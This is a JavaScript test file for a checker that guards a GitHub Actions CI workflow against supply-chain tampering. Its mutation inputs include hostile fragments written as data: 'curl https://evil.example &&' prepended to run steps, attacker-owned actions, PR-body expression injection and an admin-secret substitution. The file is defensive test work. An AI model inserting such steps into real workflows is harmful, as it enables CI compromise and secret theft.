import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {assessActionsPinCustody,REVIEWED_ACTIONS}
 from '../scripts/phase1bz-actions-pin-preflight.mjs';
const workflow=readFileSync('.github/workflows/ci.yml','utf8');
const good={workflow,workflowFiles:['ci.yml']};
const evaluate=changes=>assessActionsPinCustody({...good,...changes});
test('BZ: checked-in immutable action pins and only the CI workflow are held',()=>{
 const r=evaluate();
 assert.equal(r.immutableSelectedActionRefsCorroborated,true,r.anomalyCodes.join(','));
 assert.ok(r.selectedActionUses>=3);
 assert.equal(r.productionReleaseAuthorized,false);
 assert.equal(r.releaseDecision,'HOLD');
 assert.equal(r.criticalHighDependencyGateWaived,false);
 assert.equal(r.publisherIdentityIndependentlyVerified,false);
 assert.ok(/^[a-f0-9]{64}$/.test(r.selectedWorkflowSha256));
});
test('BZ: any mutable tag or changed action commit is rejected',()=>{
 for(const [name,sha] of Object.entries(REVIEWED_ACTIONS)){
  for(const substitution of [name+'@v4',name+'@'+'a'.repeat(40),name+'@main']){
   const altered=workflow.replace(name+'@'+sha,substitution);
   assert.notEqual(altered,workflow);
   assert.ok(evaluate({workflow:altered}).anomalyCodes.includes(
    'BZ_UNREVIEWED_OR_MUTABLE_ACTION_REF'));
  }
 }
});
test('BZ: unknown vendor, Docker action and expression syntax are rejected',()=>{
 const old='actions/checkout@'+REVIEWED_ACTIONS['actions/checkout'];
 for(const value of ['attacker/fake@'+'b'.repeat(40),
  'docker://alpine:latest','./.github/actions/unreviewed',
  "'"+old+"'"]){
  const changed=workflow.replace(old,value);
  assert.equal(evaluate({workflow:changed}).immutableSelectedActionRefsCorroborated,false);
 }
});
test('BZ: hidden inline action mappings or multiline uses never get overlooked',()=>{
 for(const added of [
  '\n      - { uses: attacker/steal@v1 }\n',
  '\n      - uses:\n          attacker/supply-chain@v2\n',
  '\n      - uses: attacker/other@v1\n'
 ]){
  assert.equal(evaluate({workflow:workflow+added}).immutableSelectedActionRefsCorroborated,false);
 }
});
test('BZ: extra, absent or substituted workflow filenames are denied',()=>{
 for(const filenames of [[],['ci.yml','release.yml'],['other.yml'],['ci.yml','ci.yml']]){
  assert.ok(evaluate({workflowFiles:filenames}).anomalyCodes.includes('BZ_UNREVIEWED_WORKFLOW_FILE'));
 }
});
test('BZ: widened permissions, PR target and dispatch triggers fail closed',()=>{
 const variants=[
  workflow.replace('  pull_request:','  pull_request_target:'),
  workflow.replace('  contents: read','  contents: write'),
  workflow+'\nworkflow_dispatch:\n',
  workflow+'\n    id-token: write\n',
  workflow+'\n    environment: production\n'
 ];
 for(const changed of variants)
  assert.equal(evaluate({workflow:changed}).immutableSelectedActionRefsCorroborated,false);
});
test('BZ: missing required pinned action and malformed source reject',()=>{
 const ref='oven-sh/setup-bun@'+REVIEWED_ACTIONS['oven-sh/setup-bun'];
 const stripped=workflow.replaceAll('- uses: '+ref,'- run: echo omitted');
 assert.ok(evaluate({workflow:stripped}).anomalyCodes.includes('BZ_REQUIRED_REVIEWED_ACTION_MISSING'));
 assert.equal(evaluate({workflow:'x'.repeat(131073)}).immutableSelectedActionRefsCorroborated,false);
 assert.equal(evaluate({workflow:''}).immutableSelectedActionRefsCorroborated,false);
});
test('BZ: source digest changes even when syntax remains valid; not release attestation',()=>{
 const baseline=evaluate();
 const changed=evaluate({workflow:workflow+'\n# comment added\n'});
 assert.equal(changed.immutableSelectedActionRefsCorroborated,true);
 assert.notEqual(baseline.selectedWorkflowSha256,changed.selectedWorkflowSha256);
 assert.equal(changed.actionExecutionAndRunnerIndependentlyAttested,false);
 assert.equal(changed.externalWormRetentionVerified,false);
 assert.equal(changed.productionReleaseBlocked,true);
});

test('1CA: exact eight hosted CI jobs, read-only scopes and bounded conditions are required',()=>{
 const r=evaluate();
 assert.equal(r.phase1caBoundedJobScopeConsistent,true,r.phase1caAnomalyCodes.join(','));
 assert.equal(r.independentCiWorkflowSemanticsAttested,false);
 assert.equal(r.productionReleaseAuthorized,false);
});
test('1CA: duplicate root keys or YAML inline root variants are refused',()=>{
 const variants=[
  workflow.replace('jobs:\n','permissions:\n  contents: write\njobs:\n'),
  workflow.replace('jobs:\n','on:\n  workflow_dispatch:\njobs:\n'),
  workflow.replace('jobs:\n','jobs: {}\n'),
  workflow.replace('name: Phase 0 baseline','name: Rogue workflow')
 ];
 for(const changed of variants)
  assert.equal(evaluate({workflow:changed}).phase1caBoundedJobScopeConsistent,false);
});
test('1CA: job-scoped write, id-token and hidden authorization overrides fail',()=>{
 const variants=[
  workflow.replace('      pull-requests: read','      pull-requests: write'),
  workflow.replace('      pull-requests: read','      pull-requests: read\n      id-token: write'),
  workflow.replace('  baseline:\n','  baseline:\n    permissions:\n      contents: write\n'),
  workflow.replace('  baseline:\n','  baseline:\n    permissions: {contents: write}\n'),
  workflow.replace('  baseline:\n','  baseline:\n    environment: production\n')
 ];
 for(const changed of variants)
  assert.equal(evaluate({workflow:changed}).phase1caBoundedJobScopeConsistent,false);
});
test('1CA: any new job, skipped job, runner replacement or unbounded job is denied',()=>{
 const variants=[
  workflow.replace('  baseline:\n','  attacker-job:\n    runs-on: ubuntu-24.04\n  baseline:\n'),
  workflow.replace('  baseline:\n','  baseline-disabled:\n'),
  workflow.replace('    runs-on: ubuntu-24.04','    runs-on: self-hosted'),
  workflow.replace('    timeout-minutes: 20','    timeout-minutes: 999'),
  workflow.replace('  baseline:\n','  baseline:\n    continue-on-error: true\n'),
  workflow.replace('  baseline:\n','  baseline:\n    container: attacker/image:latest\n')
 ];
 for(const changed of variants)
  assert.equal(evaluate({workflow:changed}).phase1caBoundedJobScopeConsistent,false);
});
test('1CA: fixed PR merge-lineage condition may not be bypassed',()=>{
 const variants=[
  workflow.replace(/^    if: github.event_name == 'pull_request'$/m,"    if: always()"),
  workflow.replace(/^    if: github.event_name == 'pull_request'$/m,''),
  workflow.replace('  baseline:\n','  baseline:\n    if: false\n')
 ];
 for(const changed of variants)
  assert.ok(evaluate({workflow:changed}).phase1caAnomalyCodes.some(x=>
   x==='CA_MERGE_LINEAGE_EVENT_GUARD_DRIFT'||x==='CA_UNREVIEWED_JOB_SKIP_CONDITION'));
});
test('1CA: reject unreviewed GitHub expression injection while preserving exact observed values',()=>{
 const orig="GITHUB_EXPECTED_PR_HEAD_SHA: "+'$'+"{{ github.event.pull_request.head.sha }}";
 const changed=workflow.replace(orig,"GITHUB_EXPECTED_PR_HEAD_SHA: "+'$'+"{{ github.event.pull_request.title }}");
 assert.notEqual(changed,workflow);
 assert.ok(evaluate({workflow:changed}).phase1caAnomalyCodes.includes('CA_UNREVIEWED_GITHUB_EXPRESSION'));
 const rogue=workflow.replace('      - name: Baseline tests',
  '      - name: Probe\n        run: echo '+ '$'+'{{ github.event.pull_request.body }}'+'\n      - name: Baseline tests');
 assert.equal(evaluate({workflow:rogue}).phase1caBoundedJobScopeConsistent,false);
});
test('1CA: YAML tabs, duplicate job permissions and aliases cannot be treated as reviewed',()=>{
 for(const changed of [
  workflow.replace('    runs-on: ubuntu-24.04','    runs-on:\tubuntu-24.04'),
  workflow.replace('      pull-requests: read','      pull-requests: read\n    permissions:\n      contents: read'),
  workflow.replace('    runs-on: ubuntu-24.04','    runs-on: &runner ubuntu-24.04'),
  workflow.replace('jobs:\n','jobs:\n  <<: *evil\n')
 ]){
  assert.equal(evaluate({workflow:changed}).phase1caBoundedJobScopeConsistent,false);
 }
});

test('1CL: exact second Github token expression must remain in named read-only CODEOWNERS observer only',()=>{
 const header='      - name: Phase 1CL live main-branch CODEOWNERS and PR requested reviewer actual API state (HARD HOLD)';
 const safe='        run: node scripts/phase1cl-live-codeowners-reviewer-onboarding.mjs --ci-hold';
 assert.ok(workflow.includes(header));
 assert.ok(workflow.includes(safe));
 assert.equal(evaluate().phase1caBoundedJobScopeConsistent,true,
  evaluate().phase1caAnomalyCodes.join(','));
 for(const replacement of [
  header.replace('reviewer actual API state','reviewer actor state'),
  safe.replace('--ci-hold','--activate'),
  safe.replace('node scripts/phase1cl-','curl https://evil.example/ && node scripts/phase1cl-')
 ]){
  const original=replacement.startsWith('      - name:')?header:safe;
  const changed=workflow.replace(original,replacement);
  assert.notEqual(changed,workflow);
  assert.ok(evaluate({workflow:changed}).phase1caAnomalyCodes.includes(
   'CA_UNREVIEWED_PHASE1CL_READONLY_STEP_OR_SOURCE_BINDING'));
 }
});
test('1CL: duplicate, unreviewed GitHub expression or token escalation denied globally',()=>{
 const expression='$'+'{{ github.token }}';
 const anchor='          GITHUB_READ_TOKEN: '+expression;
 assert.equal(workflow.split(anchor).length-1,5);
 const bad=[
  workflow.replace('          GITHUB_EXPECTED_PR_HEAD_SHA: '+'$'+'{{ github.event.pull_request.head.sha }}',
   '          GITHUB_EXPECTED_PR_HEAD_SHA: '+'$'+'{{ github.event.pull_request.title }}'),
  workflow.replace('  contents: read','  contents: write'),
  workflow.replace('          GITHUB_READ_TOKEN: '+expression,
   '          GITHUB_READ_TOKEN: '+'$'+'{{ secrets.ADMIN_PAT }}')
 ];
 for(const source of bad)
  assert.equal(evaluate({workflow:source}).phase1caBoundedJobScopeConsistent,false);
});

test('1CN: exact GitHub ruleset observer is immutable and cannot receive admin tokens or shell',()=>{
 const h='      - name: Phase 1CN actual GitHub main ruleset inventory and hidden bypass actor visibility (HARD HOLD)';
 const run='        run: node scripts/phase1cn-ruleset-bypass-reconciliation.mjs --ci-hold';
 assert.ok(workflow.includes(h));
 assert.ok(workflow.includes(run));
 assert.equal(evaluate().phase1caBoundedJobScopeConsistent,true,
  evaluate().phase1caAnomalyCodes.join(','));
 for(const [from,to] of [
  [h,h.replace('hidden bypass actor','admin bypass actor')],
  [run,run.replace('--ci-hold','--apply')],
  [run,run.replace('node scripts/', 'curl https://evil.example && node scripts/')]
 ]){
  const mutated=workflow.replace(from,to);
  assert.notEqual(mutated,workflow);
  assert.ok(evaluate({workflow:mutated}).phase1caAnomalyCodes.includes(
   'CA_UNREVIEWED_PHASE1CN_READONLY_RULESET_STEP_OR_SOURCE_BINDING'));
 }
});
test('1CN: cannot duplicate, move or substitute new read-only Github expression',()=>{
 const token='          GITHUB_READ_TOKEN: '+'$'+'{{ github.token }}';
 const replacement=workflow.replace(
  '        run: node scripts/phase1cn-ruleset-bypass-reconciliation.mjs --ci-hold',
  '        run: echo '+ '$'+'{{ github.event.pull_request.body }}');
 assert.equal(evaluate({workflow:replacement}).phase1caBoundedJobScopeConsistent,false);
 const secret=workflow.replace(token,'          GITHUB_READ_TOKEN: '+'$'+'{{ secrets.ADMIN_PAT }}');
 assert.ok(evaluate({workflow:secret}).phase1caAnomalyCodes.includes(
  'CA_UNREVIEWED_GITHUB_EXPRESSION'));
 const duplicated=workflow.replace(token,token+'\n'+token);
 assert.ok(evaluate({workflow:duplicated}).phase1caAnomalyCodes.includes(
  'CA_UNREVIEWED_GITHUB_EXPRESSION'));
});

test('1CO: exact live reviewer step is immutable and cannot fetch admin secrets',()=>{
 const header='      - name: Phase 1CO exact-head real submitted reviewer evidence and independent mandate prerequisite (HARD HOLD)';
 const run='        run: node scripts/phase1co-live-exact-head-reviewer-quorum.mjs --ci-hold';
 assert.ok(workflow.includes(header));
 assert.ok(workflow.includes(run));
 assert.equal(evaluate().phase1caBoundedJobScopeConsistent,true,
  evaluate().phase1caAnomalyCodes.join(','));
 for(const [from,to] of [
  [header,header.replace('real submitted','unverified submitted')],
  [run,run.replace('--ci-hold','--grant-approval')],
  [run,run.replace('node scripts/','curl https://evil.example && node scripts/')]
 ]){
  const modified=workflow.replace(from,to);
  assert.notEqual(modified,workflow);
  assert.ok(evaluate({workflow:modified}).phase1caAnomalyCodes.includes(
   'CA_UNREVIEWED_PHASE1CO_EXACT_READONLY_OPERATOR_STEP'));
 }
});

test('CP: immutable observed GitHub Actions check-source step cannot be replaced by release approval or arbitrary shell',()=>{
 const h='      - name: Phase 1CP bound real Github Actions check app and exact current run suite (HARD HOLD)';
 const run='        run: node scripts/phase1cp-github-actions-check-app-source.mjs --ci-hold';
 assert.ok(workflow.includes(h));
 assert.ok(workflow.includes(run));
 assert.equal(evaluate().phase1caBoundedJobScopeConsistent,true,
  evaluate().phase1caAnomalyCodes.join(','));
 for(const [from,to] of [
  [h,h.replace('exact current run','some prior run')],
  [run,run.replace('--ci-hold','--grant-prod')],
  [run,run.replace('node scripts/','curl https://evil.example && node scripts/')]
 ]){
  const changed=workflow.replace(from,to);
  assert.notEqual(changed,workflow);
  assert.ok(evaluate({workflow:changed}).phase1caAnomalyCodes.includes(
   'CA_UNREVIEWED_PHASE1CP_EXACT_RUN_CHECK_APP_READONLY_STEP'));
 }
});
test('CP: required Actions/checks READ scopes cannot be widened to writes, OIDC or unreviewed CI script',()=>{
 for(const edit of [
  s=>s.replace('      actions: read','      actions: write'),
  s=>s.replace('      checks: read','      checks: write'),
  s=>s.replace('      checks: read','      checks: read\n      id-token: write'),
  s=>s.replace('      checks: read',''),
  s=>s.replace('  live-github-governance-hold:', '  LIVE-github-governance-hold:')
 ]){
  const changed=edit(workflow);
  assert.equal(evaluate({workflow:changed}).phase1caBoundedJobScopeConsistent,false);
 }
});

test('CS: PR-only and push-only governance step selectors are immutable',()=>{
 for(const [from,to] of [
  [/^        if: github.event_name == 'push'$/m,"        if: always()"],
  ["        if: github.event_name == 'pull_request'","        if: always()"],
  ["        if: always() && github.event_name == 'push'","        if: always()"],
  ["        if: always() && github.event_name == 'pull_request'","        if: always()"]
 ]){
  const changed=workflow.replace(from,to);
  assert.notEqual(changed,workflow);
  const r=evaluate({workflow:changed});
  assert.equal(r.phase1caBoundedJobScopeConsistent,false);
  assert.ok(r.phase1caAnomalyCodes.some(x=>x.includes('GUARD')||x.includes('ARTIFACT')),r.phase1caAnomalyCodes.join(','));
 }
});
test('CS: push-only verifier command, receipt, event and token scope cannot drift',()=>{
 for(const alter of [
  s=>s.replace('scripts/phase1cs-push-head-governance.mjs --ci-hold',
   'scripts/phase1cs-push-head-governance.mjs --grant'),
  s=>s.replace('phase1cs-push-governance-hold.json','approved-go.json'),
  s=>s.replace('Phase 1CS exact current push ref','Phase 1CS fake current push ref'),
  s=>s.replace('      checks: read','      checks: write'),
  s=>s.replace(/^        if: github.event_name == 'push'$/m,
   "        if: github.event_name == 'pull_request'")
 ]){
  const r=evaluate({workflow:alter(workflow)});
  assert.equal(r.immutableSelectedActionRefsCorroborated,false);
 }
});
